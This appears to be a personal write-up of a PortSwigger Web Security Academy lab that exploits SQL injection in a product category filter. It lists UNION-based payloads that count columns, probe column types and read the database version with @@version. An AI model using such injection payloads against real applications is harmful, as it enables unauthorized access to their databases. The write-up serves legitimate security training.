---
title: 'Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft'
tags: [Portswigger Web Security Academy, Web]

category: "Security｜Practice｜Portswigger Web Security Academy｜SQL"
---

# Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
<!-- more -->
###### tags: `Portswigger Web Security Academy` `Web`
* Description: his lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
* Goal: To solve the lab, display the database version string. 

## Exp
1. Consider # of column
Payload: `?category=Accessories' union select NULL,NULL -- #`
2. Consider column type
Payload: `?category=Accessories' union select 'a','a' -- #`
Both of them contained text.
3. Attack
Payload: `?category=Accessories' union select 'abc',@@version -- #`
    :::spoiler Success Screenshot
    ![](https://i.imgur.com/vOx5kCK.png)
    :::

## Reference